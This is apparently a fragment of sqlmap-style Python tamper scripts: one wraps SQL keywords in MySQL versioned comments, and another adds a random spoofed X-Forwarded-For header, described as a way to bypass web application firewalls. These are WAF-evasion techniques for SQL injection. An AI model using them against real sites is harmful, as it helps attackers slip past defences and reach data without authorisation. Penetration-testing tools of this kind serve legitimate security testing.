        word = match.group('word')
        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, "/*!%s*/" % word)
        else:
            return match.group()

    retVal = payload

    if payload:
        retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", lambda match: process(match), retVal)
        retVal = retVal.replace(" /*!", "/*!").replace("*/ ", "*/")

    return retVal




def randomIP():
    numbers = []
    while not numbers or numbers[0] in (10, 172, 192):
        numbers = sample(xrange(1, 255), 4)
    return '.'.join(str(_) for _ in numbers)

def xforwardedfor(payload, **kwargs):
    """
    Append a fake HTTP header 'X-Forwarded-For' to bypass
    WAF (usually application based) protection
    """

    headers = kwargs.get("headers", {})
    headers["X-Forwarded-For"] = randomIP()
    return payload
